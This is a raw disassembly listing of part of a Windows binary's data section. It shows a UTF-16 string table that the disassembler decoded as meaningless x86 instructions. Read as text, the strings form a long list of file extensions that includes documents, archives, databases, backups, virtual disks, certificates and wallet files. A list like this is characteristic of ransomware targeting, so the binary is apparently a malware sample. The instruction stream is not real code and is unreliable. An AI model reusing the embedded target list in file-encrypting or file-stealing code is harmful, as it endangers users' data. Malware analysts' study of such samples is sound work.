  405da9:	00 76 00             	add    %dh,0x0(%esi)
  405dac:	00 09                	add    %cl,(%ecx)
  405dae:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  405db2:	74 00                	je     0x405db4
  405db4:	66 00 00             	data16 add %al,(%eax)
  405db7:	09 2e                	or     %ebp,(%esi)
  405db9:	00 62 00             	add    %ah,0x0(%edx)
  405dbc:	6d                   	insl   (%dx),%es:(%edi)
  405dbd:	00 70 00             	add    %dh,0x0(%eax)
  405dc0:	00 09                	add    %cl,(%ecx)
  405dc2:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  405dc6:	6b 00 76             	imul   $0x76,(%eax),%eax
  405dc9:	00 00                	add    %al,(%eax)
  405dcb:	09 2e                	or     %ebp,(%esi)
  405dcd:	00 61 00             	add    %ah,0x0(%ecx)
  405dd0:	76 00                	jbe    0x405dd2
  405dd2:	69 00 00 09 2e 00    	imul   $0x2e0900,(%eax),%eax
  405dd8:	61                   	popa
  405dd9:	00 70 00             	add    %dh,0x0(%eax)
  405ddc:	6b 00 00             	imul   $0x0,(%eax),%eax
  405ddf:	09 2e                	or     %ebp,(%esi)
  405de1:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  405de5:	00 6b 00             	add    %ch,0x0(%ebx)
  405de8:	00 09                	add    %cl,(%ecx)
  405dea:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  405def:	00 62 00             	add    %ah,0x0(%edx)
  405df2:	00 09                	add    %cl,(%ecx)
  405df4:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  405df9:	00 63 00             	add    %ah,0x0(%ebx)
  405dfc:	00 09                	add    %cl,(%ecx)
  405dfe:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  405e03:	00 66 00             	add    %ah,0x0(%esi)
  405e06:	00 0b                	add    %cl,(%ebx)
  405e08:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  405e0d:	00 76 00             	add    %dh,0x0(%esi)
  405e10:	78 00                	js     0x405e12
  405e12:	00 09                	add    %cl,(%ecx)
  405e14:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  405e18:	73 00                	jae    0x405e1a
  405e1a:	6f                   	outsl  %ds:(%esi),(%dx)
  405e1b:	00 00                	add    %al,(%eax)
  405e1d:	0b 2e                	or     (%esi),%ebp
  405e1f:	00 37                	add    %dh,(%edi)
  405e21:	00 7a 00             	add    %bh,0x0(%edx)
  405e24:	69 00 70 00 00 09    	imul   $0x9000070,(%eax),%eax
  405e2a:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  405e2e:	63 00                	arpl   %eax,(%eax)
  405e30:	65 00 00             	add    %al,%gs:(%eax)
  405e33:	09 2e                	or     %ebp,(%esi)
  405e35:	00 61 00             	add    %ah,0x0(%ecx)
  405e38:	72 00                	jb     0x405e3a
  405e3a:	6a 00                	push   $0x0
  405e3c:	00 09                	add    %cl,(%ecx)
  405e3e:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  405e42:	7a 00                	jp     0x405e44
  405e44:	32 00                	xor    (%eax),%al
  405e46:	00 09                	add    %cl,(%ecx)
  405e48:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405e4c:	61                   	popa
  405e4d:	00 62 00             	add    %ah,0x0(%edx)
  405e50:	00 0b                	add    %cl,(%ebx)
  405e52:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  405e56:	7a 00                	jp     0x405e58
  405e58:	69 00 70 00 00 09    	imul   $0x9000070,(%eax),%eax
  405e5e:	2e 00 6c 00 7a       	add    %ch,%cs:0x7a(%eax,%eax,1)
  405e63:	00 68 00             	add    %ch,0x0(%eax)
  405e66:	00 09                	add    %cl,(%ecx)
  405e68:	2e 00 74 00 61       	add    %dh,%cs:0x61(%eax,%eax,1)
  405e6d:	00 72 00             	add    %dh,0x0(%edx)
  405e70:	00 0b                	add    %cl,(%ebx)
  405e72:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  405e76:	70 00                	jo     0x405e78
  405e78:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  405e7c:	00 07                	add    %al,(%edi)
  405e7e:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  405e82:	7a 00                	jp     0x405e84
  405e84:	00 0b                	add    %cl,(%ebx)
  405e86:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  405e8a:	70 00                	jo     0x405e8c
  405e8c:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  405e90:	00 11                	add    %dl,(%ecx)
  405e92:	2e 00 74 00 6f       	add    %dh,%cs:0x6f(%eax,%eax,1)
  405e97:	00 72 00             	add    %dh,0x0(%edx)
  405e9a:	72 00                	jb     0x405e9c
  405e9c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405ea0:	74 00                	je     0x405ea2
  405ea2:	00 09                	add    %cl,(%ecx)
  405ea4:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  405ea8:	70 00                	jo     0x405eaa
  405eaa:	67 00 00             	add    %al,(%bx,%si)
  405ead:	0b 2e                	or     (%esi),%ebp
  405eaf:	00 63 00             	add    %ah,0x0(%ebx)
  405eb2:	6f                   	outsl  %ds:(%esi),(%dx)
  405eb3:	00 72 00             	add    %dh,0x0(%edx)
  405eb6:	65 00 00             	add    %al,%gs:(%eax)
  405eb9:	09 2e                	or     %ebp,(%esi)
  405ebb:	00 70 00             	add    %dh,0x0(%eax)
  405ebe:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  405ec2:	00 09                	add    %cl,(%ecx)
  405ec4:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  405ec8:	63 00                	arpl   %eax,(%eax)
  405eca:	6f                   	outsl  %ds:(%esi),(%dx)
  405ecb:	00 00                	add    %al,(%eax)
  405ecd:	09 2e                	or     %ebp,(%esi)
  405ecf:	00 70 00             	add    %dh,0x0(%eax)
  405ed2:	61                   	popa
  405ed3:	00 73 00             	add    %dh,0x0(%ebx)
  405ed6:	00 07                	add    %al,(%edi)
  405ed8:	2e 00 64 00 62       	add    %ah,%cs:0x62(%eax,%eax,1)
  405edd:	00 00                	add    %al,(%eax)
  405edf:	09 2e                	or     %ebp,(%esi)
  405ee1:	00 77 00             	add    %dh,0x0(%edi)
  405ee4:	6d                   	insl   (%dx),%es:(%edi)
  405ee5:	00 76 00             	add    %dh,0x0(%esi)
  405ee8:	00 09                	add    %cl,(%ecx)
  405eea:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  405eee:	77 00                	ja     0x405ef0
  405ef0:	66 00 00             	data16 add %al,(%eax)
  405ef3:	09 2e                	or     %ebp,(%esi)
  405ef5:	00 63 00             	add    %ah,0x0(%ebx)
  405ef8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405efc:	00 09                	add    %cl,(%ecx)
  405efe:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  405f02:	61                   	popa
  405f03:	00 6b 00             	add    %ch,0x0(%ebx)
  405f06:	00 0f                	add    %cl,(%edi)
  405f08:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  405f0c:	61                   	popa
  405f0d:	00 63 00             	add    %ah,0x0(%ebx)
  405f10:	6b 00 75             	imul   $0x75,(%eax),%eax
  405f13:	00 70 00             	add    %dh,0x0(%eax)
  405f16:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  405f1c:	63 00                	arpl   %eax,(%eax)
  405f1e:	63 00                	arpl   %eax,(%eax)
  405f20:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  405f24:	00 09                	add    %cl,(%ecx)
  405f26:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  405f2a:	61                   	popa
  405f2b:	00 79 00             	add    %bh,0x0(%ecx)
  405f2e:	00 09                	add    %cl,(%ecx)
  405f30:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  405f34:	37                   	aaa
  405f35:	00 63 00             	add    %ah,0x0(%ebx)
  405f38:	00 0b                	add    %cl,(%ebx)
  405f3a:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  405f3e:	78 00                	js     0x405f40
  405f40:	69 00 66 00 00 09    	imul   $0x9000066,(%eax),%eax
  405f46:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  405f4a:	73 00                	jae    0x405f4c
  405f4c:	73 00                	jae    0x405f4e
  405f4e:	00 09                	add    %cl,(%ecx)
  405f50:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  405f54:	61                   	popa
  405f55:	00 77 00             	add    %dh,0x0(%edi)
  405f58:	00 09                	add    %cl,(%ecx)
  405f5a:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  405f5e:	34 00                	xor    $0x0,%al
  405f60:	61                   	popa
  405f61:	00 00                	add    %al,(%eax)
  405f63:	09 2e                	or     %ebp,(%esi)
  405f65:	00 77 00             	add    %dh,0x0(%edi)
  405f68:	6d                   	insl   (%dx),%es:(%edi)
  405f69:	00 61 00             	add    %ah,0x0(%ecx)
  405f6c:	00 09                	add    %cl,(%ecx)
  405f6e:	2e 00 66 00          	add    %ah,%cs:0x0(%esi)
  405f72:	6c                   	insb   (%dx),%es:(%edi)
  405f73:	00 76 00             	add    %dh,0x0(%esi)
  405f76:	00 09                	add    %cl,(%ecx)
  405f78:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  405f7c:	69 00 65 00 00 09    	imul   $0x9000065,(%eax),%eax
  405f82:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  405f86:	75 00                	jne    0x405f88
  405f88:	6d                   	insl   (%dx),%es:(%edi)
  405f89:	00 00                	add    %al,(%eax)
  405f8b:	0d 2e 00 69 00       	or     $0x69002e,%eax
  405f90:	62 00                	bound  %eax,(%eax)
  405f92:	61                   	popa
  405f93:	00 6e 00             	add    %ch,0x0(%esi)
  405f96:	6b 00 00             	imul   $0x0,(%eax),%eax
  405f99:	0f 2e 00             	ucomiss (%eax),%xmm0
  405f9c:	77 00                	ja     0x405f9e
  405f9e:	61                   	popa
  405f9f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  405fa3:	00 65 00             	add    %ah,0x0(%ebp)
  405fa6:	74 00                	je     0x405fa8
  405fa8:	00 09                	add    %cl,(%ecx)
  405faa:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405fae:	73 00                	jae    0x405fb0
  405fb0:	73 00                	jae    0x405fb2
  405fb2:	00 07                	add    %al,(%edi)
  405fb4:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  405fb8:	73 00                	jae    0x405fba
  405fba:	00 07                	add    %al,(%edi)
  405fbc:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  405fc0:	62 00                	bound  %eax,(%eax)
  405fc2:	00 09                	add    %cl,(%ecx)
  405fc4:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405fc8:	72 00                	jb     0x405fca
  405fca:	74 00                	je     0x405fcc
  405fcc:	00 0b                	add    %cl,(%ebx)
  405fce:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  405fd2:	6c                   	insb   (%dx),%es:(%edi)
  405fd3:	00 73 00             	add    %dh,0x0(%ebx)
  405fd6:	6d                   	insl   (%dx),%es:(%edi)
  405fd7:	00 00                	add    %al,(%eax)
  405fd9:	0b 2e                	or     (%esi),%ebp
  405fdb:	00 78 00             	add    %bh,0x0(%eax)
  405fde:	6c                   	insb   (%dx),%es:(%edi)
  405fdf:	00 73 00             	add    %dh,0x0(%ebx)
  405fe2:	62 00                	bound  %eax,(%eax)
  405fe4:	00 07                	add    %al,(%edi)
  405fe6:	2e 00 37             	add    %dh,%cs:(%edi)
  405fe9:	00 7a 00             	add    %bh,0x0(%edx)
  405fec:	00 09                	add    %cl,(%ecx)
  405fee:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405ff2:	70 00                	jo     0x405ff4
  405ff4:	70 00                	jo     0x405ff6
  405ff6:	00 0b                	add    %cl,(%ebx)
  405ff8:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  405ffc:	61                   	popa
  405ffd:	00 76 00             	add    %dh,0x0(%esi)
  406000:	61                   	popa
  406001:	00 00                	add    %al,(%eax)
  406003:	09 2e                	or     %ebp,(%esi)
  406005:	00 6a 00             	add    %ch,0x0(%edx)
  406008:	70 00                	jo     0x40600a
  40600a:	65 00 00             	add    %al,%gs:(%eax)
  40600d:	09 2e                	or     %ebp,(%esi)
  40600f:	00 69 00             	add    %ch,0x0(%ecx)
  406012:	6e                   	outsb  %ds:(%esi),(%dx)
  406013:	00 69 00             	add    %ch,0x0(%ecx)
  406016:	00 0b                	add    %cl,(%ebx)
  406018:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  40601c:	6c                   	insb   (%dx),%es:(%edi)
  40601d:	00 6f 00             	add    %ch,0x0(%edi)
  406020:	62 00                	bound  %eax,(%eax)
  406022:	00 09                	add    %cl,(%ecx)
  406024:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  406028:	70 00                	jo     0x40602a
  40602a:	73 00                	jae    0x40602c
  40602c:	00 0b                	add    %cl,(%ebx)
  40602e:	2e 00 64 00 6f       	add    %ah,%cs:0x6f(%eax,%eax,1)
  406033:	00 63 00             	add    %ah,0x0(%ebx)
  406036:	6d                   	insl   (%dx),%es:(%edi)
  406037:	00 00                	add    %al,(%eax)
  406039:	09 2e                	or     %ebp,(%esi)
  40603b:	00 77 00             	add    %dh,0x0(%edi)
  40603e:	61                   	popa
  40603f:	00 76 00             	add    %dh,0x0(%esi)
  406042:	00 09                	add    %cl,(%ecx)
  406044:	2e 00 33             	add    %dh,%cs:(%ebx)
  406047:	00 67 00             	add    %ah,0x0(%edi)
  40604a:	70 00                	jo     0x40604c
  40604c:	00 0b                	add    %cl,(%ebx)
  40604e:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  406052:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  406056:	6d                   	insl   (%dx),%es:(%edi)
  406057:	00 00                	add    %al,(%eax)
  406059:	09 2e                	or     %ebp,(%esi)
  40605b:	00 6d 00             	add    %ch,0x0(%ebp)
  40605e:	34 00                	xor    $0x0,%al
  406060:	76 00                	jbe    0x406062
  406062:	00 09                	add    %cl,(%ecx)
  406064:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406068:	6d                   	insl   (%dx),%es:(%edi)
  406069:	00 76 00             	add    %dh,0x0(%esi)
  40606c:	00 09                	add    %cl,(%ecx)
  40606e:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406072:	34 00                	xor    $0x0,%al
  406074:	70 00                	jo     0x406076
  406076:	00 09                	add    %cl,(%ecx)
  406078:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  40607c:	76 00                	jbe    0x40607e
  40607e:	67 00 00             	add    %al,(%bx,%si)
  406081:	09 2e                	or     %ebp,(%esi)
  406083:	00 6f 00             	add    %ch,0x0(%edi)
  406086:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40608a:	00 07                	add    %al,(%edi)
  40608c:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406090:	6b 00 00             	imul   $0x0,(%eax),%eax
  406093:	09 2e                	or     %ebp,(%esi)
  406095:	00 76 00             	add    %dh,0x0(%esi)
  406098:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40609c:	00 0b                	add    %cl,(%ebx)
  40609e:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  4060a2:	6d                   	insl   (%dx),%es:(%edi)
  4060a3:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  4060a7:	00 00                	add    %al,(%eax)
  4060a9:	0f 2e 00             	ucomiss (%eax),%xmm0
  4060ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ad:	00 6e 00             	add    %ch,0x0(%esi)
  4060b0:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  4060b4:	6b 00 67             	imul   $0x67,(%eax),%eax
  4060b7:	00 00                	add    %al,(%eax)
  4060b9:	0d 2e 00 61 00       	or     $0x61002e,%eax
  4060be:	63 00                	arpl   %eax,(%eax)
  4060c0:	63 00                	arpl   %eax,(%eax)
  4060c2:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4060c6:	00 09                	add    %cl,(%ecx)
  4060c8:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  4060cc:	73 00                	jae    0x4060ce
  4060ce:	70 00                	jo     0x4060d0
  4060d0:	00 0b                	add    %cl,(%ebx)
  4060d2:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  4060d6:	73 00                	jae    0x4060d8
  4060d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4060d9:	00 6e 00             	add    %ch,0x0(%esi)
  4060dc:	00 09                	add    %cl,(%ecx)
  4060de:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  4060e2:	69 00 66 00 00 09    	imul   $0x9000066,(%eax),%eax
  4060e8:	2e 00 6c 00 6f       	add    %ch,%cs:0x6f(%eax,%eax,1)
  4060ed:	00 67 00             	add    %ah,0x0(%edi)
  4060f0:	00 07                	add    %al,(%edi)
  4060f2:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  4060f6:	7a 00                	jp     0x4060f8
  4060f8:	00 0f                	add    %cl,(%edi)
  4060fa:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4060fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ff:	00 6e 00             	add    %ch,0x0(%esi)
  406102:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  406106:	67 00 00             	add    %al,(%bx,%si)
  406109:	07                   	pop    %es
  40610a:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  40610e:	62 00                	bound  %eax,(%eax)
  406110:	00 09                	add    %cl,(%ecx)
  406112:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406116:	31 00                	xor    %eax,(%eax)
  406118:	76 00                	jbe    0x40611a
  40611a:	00 09                	add    %cl,(%ecx)
  40611c:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406120:	6c                   	insb   (%dx),%es:(%edi)
  406121:	00 6e 00             	add    %ch,0x0(%esi)
  406124:	00 09                	add    %cl,(%ecx)
  406126:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40612a:	73 00                	jae    0x40612c
  40612c:	74 00                	je     0x40612e
  40612e:	00 09                	add    %cl,(%ecx)
  406130:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  406134:	62 00                	bound  %eax,(%eax)
  406136:	6a 00                	push   $0x0
  406138:	00 0b                	add    %cl,(%ebx)
  40613a:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40613e:	6c                   	insb   (%dx),%es:(%edi)
  40613f:	00 61 00             	add    %ah,0x0(%ecx)
  406142:	6d                   	insl   (%dx),%es:(%edi)
  406143:	00 00                	add    %al,(%eax)
  406145:	0b 2e                	or     (%esi),%ebp
  406147:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40614b:	00 76 00             	add    %dh,0x0(%esi)
  40614e:	75 00                	jne    0x406150
  406150:	00 09                	add    %cl,(%ecx)
  406152:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  406156:	6e                   	outsb  %ds:(%esi),(%dx)
  406157:	00 63 00             	add    %ah,0x0(%ebx)
  40615a:	00 09                	add    %cl,(%ecx)
  40615c:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406160:	76 00                	jbe    0x406162
  406162:	73 00                	jae    0x406164
  406164:	00 09                	add    %cl,(%ecx)
  406166:	2e 00 64 00 62       	add    %ah,%cs:0x62(%eax,%eax,1)
  40616b:	00 66 00             	add    %ah,0x0(%esi)
  40616e:	00 09                	add    %cl,(%ecx)
  406170:	2e 00 74 00 62       	add    %dh,%cs:0x62(%eax,%eax,1)
  406175:	00 69 00             	add    %ch,0x0(%ecx)
  406178:	00 09                	add    %cl,(%ecx)
  40617a:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  40617e:	70 00                	jo     0x406180
  406180:	64 00 00             	add    %al,%fs:(%eax)
  406183:	09 2e                	or     %ebp,(%esi)
  406185:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  406189:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40618d:	0b 2e                	or     (%esi),%ebp
  40618f:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  406193:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  406197:	00 00                	add    %al,(%eax)
  406199:	0b 2e                	or     (%esi),%ebp
  40619b:	00 78 00             	add    %bh,0x0(%eax)
  40619e:	6c                   	insb   (%dx),%es:(%edi)
  40619f:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	0b 2e                	or     (%esi),%ebp
  4061a7:	00 70 00             	add    %dh,0x0(%eax)
  4061aa:	70 00                	jo     0x4061ac
  4061ac:	74 00                	je     0x4061ae
  4061ae:	6d                   	insl   (%dx),%es:(%edi)
  4061af:	00 00                	add    %al,(%eax)
  4061b1:	0b 2e                	or     (%esi),%ebp
  4061b3:	00 70 00             	add    %dh,0x0(%eax)
  4061b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4061b7:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  4061bb:	00 00                	add    %al,(%eax)
  4061bd:	0b 2e                	or     (%esi),%ebp
  4061bf:	00 70 00             	add    %dh,0x0(%eax)
  4061c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4061c3:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  4061c7:	00 00                	add    %al,(%eax)
  4061c9:	09 2e                	or     %ebp,(%esi)
  4061cb:	00 70 00             	add    %dh,0x0(%eax)
  4061ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4061cf:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4061d3:	09 2e                	or     %ebp,(%esi)
  4061d5:	00 78 00             	add    %bh,0x0(%eax)
  4061d8:	6c                   	insb   (%dx),%es:(%edi)
  4061d9:	00 77 00             	add    %dh,0x0(%edi)
  4061dc:	00 09                	add    %cl,(%ecx)
  4061de:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  4061e2:	70 00                	jo     0x4061e4
  4061e4:	73 00                	jae    0x4061e6
  4061e6:	00 09                	add    %cl,(%ecx)
  4061e8:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  4061ec:	73 00                	jae    0x4061ee
  4061ee:	64 00 00             	add    %al,%fs:(%eax)
  4061f1:	09 2e                	or     %ebp,(%esi)
  4061f3:	00 78 00             	add    %bh,0x0(%eax)
  4061f6:	73 00                	jae    0x4061f8
  4061f8:	66 00 00             	data16 add %al,(%eax)
  4061fb:	09 2e                	or     %ebp,(%esi)
  4061fd:	00 78 00             	add    %bh,0x0(%eax)
  406200:	73 00                	jae    0x406202
  406202:	6c                   	insb   (%dx),%es:(%edi)
  406203:	00 00                	add    %al,(%eax)
  406205:	09 2e                	or     %ebp,(%esi)
  406207:	00 6b 00             	add    %ch,0x0(%ebx)
  40620a:	6d                   	insl   (%dx),%es:(%edi)
  40620b:	00 7a 00             	add    %bh,0x0(%edx)
  40620e:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  406214:	63 00                	arpl   %eax,(%eax)
  406216:	63 00                	arpl   %eax,(%eax)
  406218:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40621c:	00 09                	add    %cl,(%ecx)
  40621e:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406222:	74 00                	je     0x406224
  406224:	6d                   	insl   (%dx),%es:(%edi)
  406225:	00 00                	add    %al,(%eax)
  406227:	0d 2e 00 61 00       	or     $0x61002e,%eax
  40622c:	63 00                	arpl   %eax,(%eax)
  40622e:	63 00                	arpl   %eax,(%eax)
  406230:	64 00 74 00 00       	add    %dh,%fs:0x0(%eax,%eax,1)
  406235:	0b 2e                	or     (%esi),%ebp
  406237:	00 70 00             	add    %dh,0x0(%eax)
  40623a:	70 00                	jo     0x40623c
  40623c:	61                   	popa
  40623d:	00 6d 00             	add    %ch,0x0(%ebp)
  406240:	00 09                	add    %cl,(%ecx)
  406242:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406246:	70 00                	jo     0x406248
  406248:	73 00                	jae    0x40624a
  40624a:	00 0b                	add    %cl,(%ebx)
  40624c:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406250:	70 00                	jo     0x406252
  406252:	73 00                	jae    0x406254
  406254:	6d                   	insl   (%dx),%es:(%edi)
  406255:	00 00                	add    %al,(%eax)
  406257:	09 2e                	or     %ebp,(%esi)
  406259:	00 31                	add    %dh,(%ecx)
  40625b:	00 63 00             	add    %ah,0x0(%ebx)
  40625e:	64 00 00             	add    %al,%fs:(%eax)
  406261:	09 2e                	or     %ebp,(%esi)
  406263:	00 33                	add    %dh,(%ebx)
  406265:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  406269:	00 00                	add    %al,(%eax)
  40626b:	09 2e                	or     %ebp,(%esi)
  40626d:	00 33                	add    %dh,(%ebx)
  40626f:	00 66 00             	add    %ah,0x0(%esi)
  406272:	72 00                	jb     0x406274
  406274:	00 09                	add    %cl,(%ecx)
  406276:	2e 00 33             	add    %dh,%cs:(%ebx)
  406279:	00 67 00             	add    %ah,0x0(%edi)
  40627c:	32 00                	xor    (%eax),%al
  40627e:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  406284:	63 00                	arpl   %eax,(%eax)
  406286:	63 00                	arpl   %eax,(%eax)
  406288:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40628c:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  406292:	63 00                	arpl   %eax,(%eax)
  406294:	63 00                	arpl   %eax,(%eax)
  406296:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40629a:	00 0d 2e 00 61 00    	add    %cl,0x61002e
  4062a0:	63 00                	arpl   %eax,(%eax)
  4062a2:	63 00                	arpl   %eax,(%eax)
  4062a4:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  4062a8:	00 09                	add    %cl,(%ecx)
  4062aa:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062ae:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  4062b2:	00 07                	add    %al,(%edi)
  4062b4:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062b8:	69 00 00 09 2e 00    	imul   $0x2e0900,(%eax),%eax
  4062be:	61                   	popa
  4062bf:	00 69 00             	add    %ch,0x0(%ecx)
  4062c2:	33 00                	xor    (%eax),%eax
  4062c4:	00 09                	add    %cl,(%ecx)
  4062c6:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062ca:	69 00 34 00 00 09    	imul   $0x9000034,(%eax),%eax
  4062d0:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062d4:	69 00 35 00 00 09    	imul   $0x9000035,(%eax),%eax
  4062da:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062de:	69 00 36 00 00 09    	imul   $0x9000036,(%eax),%eax
  4062e4:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062e8:	69 00 37 00 00 09    	imul   $0x9000037,(%eax),%eax
  4062ee:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062f2:	69 00 38 00 00 09    	imul   $0x9000038,(%eax),%eax
  4062f8:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4062fc:	72 00                	jb     0x4062fe
  4062fe:	77 00                	ja     0x406300
  406300:	00 0b                	add    %cl,(%ebx)
  406302:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406306:	73 00                	jae    0x406308
  406308:	63 00                	arpl   %eax,(%eax)
  40630a:	78 00                	js     0x40630c
  40630c:	00 09                	add    %cl,(%ecx)
  40630e:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406312:	73 00                	jae    0x406314
  406314:	6d                   	insl   (%dx),%es:(%edi)
  406315:	00 00                	add    %al,(%eax)
  406317:	0b 2e                	or     (%esi),%ebp
  406319:	00 61 00             	add    %ah,0x0(%ecx)
  40631c:	73 00                	jae    0x40631e
  40631e:	6d                   	insl   (%dx),%es:(%edi)
  40631f:	00 78 00             	add    %bh,0x0(%eax)
  406322:	00 09                	add    %cl,(%ecx)
  406324:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406328:	76 00                	jbe    0x40632a
  40632a:	73 00                	jae    0x40632c
  40632c:	00 09                	add    %cl,(%ecx)
  40632e:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406332:	69 00 6e 00 00 09    	imul   $0x900006e,(%eax),%eax
  406338:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40633c:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  406340:	00 09                	add    %cl,(%ecx)
  406342:	2e 00 64 00 62       	add    %ah,%cs:0x62(%eax,%eax,1)
  406347:	00 78 00             	add    %bh,0x0(%eax)
  40634a:	00 09                	add    %cl,(%ecx)
  40634c:	2e 00 64 00 63       	add    %ah,%cs:0x63(%eax,%eax,1)
  406351:	00 6d 00             	add    %ch,0x0(%ebp)
  406354:	00 09                	add    %cl,(%ecx)
  406356:	2e 00 64 00 63       	add    %ah,%cs:0x63(%eax,%eax,1)
  40635b:	00 72 00             	add    %dh,0x0(%edx)
  40635e:	00 0b                	add    %cl,(%ebx)
  406360:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
